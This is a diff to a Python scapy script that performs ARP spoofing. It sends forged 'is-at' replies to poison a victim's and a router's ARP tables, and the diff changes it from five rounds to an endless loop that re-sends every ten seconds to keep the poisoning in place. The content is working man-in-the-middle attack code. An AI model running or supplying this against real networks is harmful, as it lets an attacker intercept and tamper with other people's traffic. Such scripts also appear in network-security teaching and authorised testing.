@@ -3,6 +3,7 @@ from scapy.layers.l2 import getmacbyip
 from scapy.layers.l2 import get_if_hwaddr
 from scapy.all import send
 import sys
+import time
 
 
 def arp_spoof(target_ip, target_mac, sender_ip):
@@ -10,6 +11,7 @@ def arp_spoof(target_ip, target_mac, sender_ip):
     packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
                  hwdst=target_mac, pdst=target_ip ) #Create arp replay packet to poisoning victim's arp table
     send(packet, verbose=False)
+    time.sleep(10)
 
 def arp_restore(target_ip, target_mac, sender_ip, sender_mac):
     packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
@@ -24,7 +26,7 @@ if __name__ == "__main__":
 
     try:
         print("Sending spoofed ARP packets")
-        for i in range(5):
+        while True:
             arp_spoof(t_ip, t_mac, r_ip)
             arp_spoof(r_ip, r_mac, t_ip)
     except KeyboardInterrupt:
